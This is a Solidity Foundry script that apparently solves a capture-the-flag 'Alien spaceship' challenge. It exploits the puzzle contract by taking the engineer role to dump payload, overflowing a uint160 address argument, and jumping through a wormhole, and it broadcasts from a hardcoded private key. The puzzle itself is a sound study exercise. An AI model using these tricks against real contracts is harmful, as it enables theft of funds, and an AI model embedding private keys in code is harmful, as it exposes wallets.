// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";
import {Script, console} from "forge-std/Script.sol";
import "test/Alien.t.sol";

contract Challenge {
    address public immutable ALIENSPACESHIP;

    function isSolved() external view returns (bool) {}
}

contract AlienScript is Script {
    uint256 privateKey = 0x1fe4eec2a51fecb47ba936411a6d375e10e6bc0c3a9883aff0838889e2829ca9;
    address target = 0xb780EEB8e65e7aF93c475e2c131cd21854d6b7E8;
    VmSafe.Wallet wallet;

    Alien alienShip;

    Challenge challenge;

    function setUp() public {
        wallet = vm.createWallet(privateKey);

        challenge = Challenge(target);
        alienShip = Alien(challenge.ALIENSPACESHIP());

        console.log("Is solved: ", challenge.isSolved());
        console.log("alien address: ", address(alienShip));
    }

    function run() external {
        if (challenge.isSolved()) {
            console.log("Already solved");
            return;
        }
        console.log("Distane", uint256(alienShip.distance()));
        console.logInt(alienShip.distance());
        console.log(alienShip.payloadMass()); //@5000000000000000000000
        // console.logBytes(address(alienShip).code);
        vm.startBroadcast(privateKey);

        // stage1();

        // Physicist physicist = new Physicist(address(alienShip));
        Physicist physicist = Physicist(0xF50B2e7304798f76aE5133d4427Ca111f6C67976);
        console.log("is wormhole enabled: ", alienShip.wormholesEnabled());
        console.log("physicist address: ", address(physicist));
        

        physicist.applyForCaptainPromotion();

        new DumpEngineer(address(alienShip));
        physicist.visitArea51();

        new DumpEngineer(address(alienShip));
        
        physicist.jumpThroughWormhole(1e23, 1e23, 1e23);
        console.logInt(alienShip.distance());

        new DumpEngineer(address(alienShip));
        physicist.abortMission();

        vm.stopBroadcast();
    }

    function _visitArea51() internal {
        console.log("visit area 51");
        console.logInt(alienShip.distance());

        uint160 myAddress = uint160(address(wallet.addr));
        uint160 arg = type(uint160).max - myAddress + 52;
        uint160 result;

        console.log("arg: ", arg);
        assembly {
            result := add(myAddress, arg)
        }
        console.log("result: ", result);
        // we need overflow this address value so final result is 51;

        alienShip.visitArea51(address(arg));
        console.logInt(alienShip.distance());
    }

    function stage1() internal {
        Engineer engineer = new Engineer(address(alienShip)); //0x11aF3E1869C64527D218786560022FD82826E880
        new DumpEngineer(address(alienShip));
    }
}

contract DumpEngineer {
    Alien alien;

    constructor(address _alien) {
        alien = Alien(_alien);
        alien.applyForJob(alien.ENGINEER());
        uint256 limit = 0x1b1ae4d6e2ef500000;
        if (alien.payloadMass() > limit) {
            alien.dumpPayload(alien.payloadMass() - (limit + 1));
        } else {
            console.log("current payload mass: ", alien.payloadMass());
            console.log("no need to dump");
        }
    }
}
